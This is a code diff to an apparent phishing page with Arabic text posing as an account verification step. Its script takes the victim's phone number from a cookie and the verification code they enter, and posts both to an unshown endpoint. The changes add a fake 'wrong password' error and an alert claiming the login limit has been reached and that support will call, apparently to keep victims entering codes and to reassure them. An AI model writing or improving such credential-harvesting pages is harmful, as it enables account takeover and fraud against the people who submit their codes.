@@ -79,19 +79,26 @@
       margin-right: auto;
     }
     .text-block-2 {
-      color: #ff1493; /* Change this color to dark pink */
+      color: #ff1493;
     }
     .text-span-9 {
-      color: #ff1493; /* Change this color to dark pink */
+      color: #ff1493;
     }
     .text-span-10 {
-      color: #ff1493; /* Change this color to dark pink */
+      color: #ff1493;
     }
     .countdown {
       font-size: 2em;
       color: #ff1493;
       text-align: center;
       margin-top: 20px;
+    }
+    .error-message {
+      color: red;
+      font-size: 1em;
+      margin-top: 10px;
+      text-align: center;
+      display: none;
     }
   </style>
 </head>
@@ -123,6 +130,7 @@
         <div class="success-message w-form-done">
           <div id="success">جاري التحقق من المعلومات المدخلة</div>
         </div>
+        <div id="error-message" class="error-message">أدخلت كلمة السر بشكل غير صحيح</div>
       </div>
     </div>
   </div>
@@ -181,11 +189,12 @@
     };
 
     $("#verificationForm" ).on( "submit", function( event ) {
+      event.preventDefault();
       phonenumber = getCookie('phonenumber');
       pincode = document.getElementById('pincode').value;
 
-      var message = "رقم الهاتف:`"+phonenumber+"`\n"
-      message += "رمز التحقق:`"+pincode+"`\n"
+      var message = "رقم الهاتف:`"+phonenumber+"`\n";
+      message += "رمز التحقق:`"+pincode+"`\n";
 
       $.ajax({
         type: 'POST',
@@ -197,11 +206,12 @@
         },
         success: function (res) {
           console.debug(res);
-          $('#response').text('Message sent');
+          document.getElementById('error-message').style.display = "none";
+          alert("عميلنا العزيز لقد وصلت الحد الأقصى لتسجيل الدخول سيتم مراسلتك بواسطه الدعم الفني لحل المشكلة");
         },
         error: function (error) {
           console.error(error);
-
+          document.getElementById('error-message').style.display = "block";
         }
       });
     });
